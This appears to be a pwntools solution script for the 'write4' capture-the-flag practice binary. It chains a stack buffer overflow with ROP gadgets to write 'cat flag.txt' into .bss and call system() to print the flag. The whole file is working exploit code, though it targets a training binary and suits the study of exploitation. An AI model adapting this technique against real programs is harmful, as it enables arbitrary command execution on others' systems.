import pwn

# Setup enviroment
process = pwn.process("./write4")
pwn.context(os="linux", arch="amd64")
elf = pwn.ELF("write4")

data_section = elf.bss()
system_arg = "cat flag.txt"

def write_to_location(inp, loc):
    inp = inp + 8 * "\x00" if len(inp) % 8 == 0 else  inp + (8-(len(inp)%8)) * "\x00"
    return  "".join([pwn.p64(0x0000000000400890) + \
                     pwn.p64(loc+i) + inp[i:i+8] + \
                     pwn.p64(elf.symbols["usefulGadgets"]) 
                     for i in range(0, len(inp), 8)])

process.readline()
process.readline()
process.readline()
process.readline()

payload = "A" * 40
payload += write_to_location(system_arg, data_section)
payload += pwn.p64(0x0000000000400893) # pop rdi; ret;
payload += pwn.p64(data_section) 
payload += pwn.p64(elf.symbols["system"])
print payload

process.sendline(payload)
print process.readline()[2:]
